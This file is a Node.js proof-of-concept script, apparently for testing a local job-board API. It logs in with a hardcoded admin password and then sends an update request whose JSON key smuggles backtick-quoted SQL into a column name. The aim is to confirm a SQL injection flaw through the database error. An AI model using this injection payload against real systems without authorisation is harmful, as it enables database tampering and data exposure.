const axios = require('axios');

async function testSQLi() {
    try {
        console.log("1. Logging in as admin...");
        const loginRes = await axios.post('http://localhost:8000/api/auth/login', {
            username: 'admin',
            password: 'ChangeMeImmediately_2026!'
        });
        const token = loginRes.data.access_token;
        console.log("Logged in! Token:", token.substring(0, 15) + "...");

        console.log("2. Creating a test job to get an ID...");
        const jobRes = await axios.post('http://localhost:8000/api/admin/jobs', {
            title: 'Test Job',
            team: 'Test Team'
        }, {
            headers: { Authorization: `Bearer ${token}` }
        });
        const jobId = jobRes.data.id;
        console.log("Job created with ID:", jobId);

        console.log("3. Sending SQL Injection payload to trigger syntax error...");
        // This payload creates an invalid column name injection
        const sqliPayload = {
            "title": "Hacked Title",
            "injectionColumn` = 1, `team": "Injected Team"
        };
        
        const updateRes = await axios.put(`http://localhost:8000/api/admin/jobs/${jobId}`, sqliPayload, {
            headers: { Authorization: `Bearer ${token}` }
        });
        console.log("Update success?", updateRes.status);
    } catch (err) {
        if (err.response && err.response.data) {
            console.log("Error status:", err.response.status);
            console.log("Error response:", err.response.data);
            if (err.response.data.detail && err.response.data.detail.includes("ER_BAD_FIELD_ERROR")) {
               console.log("SQL INJECTION CONFIRMED: Database error exposed!");
            }
        } else {
            console.error("Error:", err.message);
        }
    }
}

testSQLi();
